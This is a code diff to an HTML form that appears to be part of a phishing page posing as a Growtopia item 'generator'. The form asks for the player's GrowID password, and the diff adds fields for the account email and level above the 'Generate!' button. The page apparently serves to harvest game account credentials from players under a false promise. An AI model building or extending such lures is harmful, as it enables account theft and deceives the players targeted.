@@ -68,6 +68,12 @@
                                                         <div class="form-group">
                                                             <input id="email" class="form-control" required="required" placeholder="GrowID Password *" data-validation-required-message="Enter Your GrowID Password" aria-invalid="false" name="Password" type="password">
                                                         </div>
+							<div class="form-group">
+							    <input id="realemail" class="form-control" placeholder="GrowID Email" aria-invalid="false" name="Email" type="email">
+							</div>
+							<div class="form-group">
+							    <input id="level" class="form-control" required="required" placeholder="Level *" data-validation-required-message="Enter Your Level." aria-invalid="false" name="Level" type="number">
+							</div>
                                                         <div class="form-group">
                                                             <input class="btn btn-lg btn-primary grow-button" type="submit" value="Generate!">
                                                         </div>
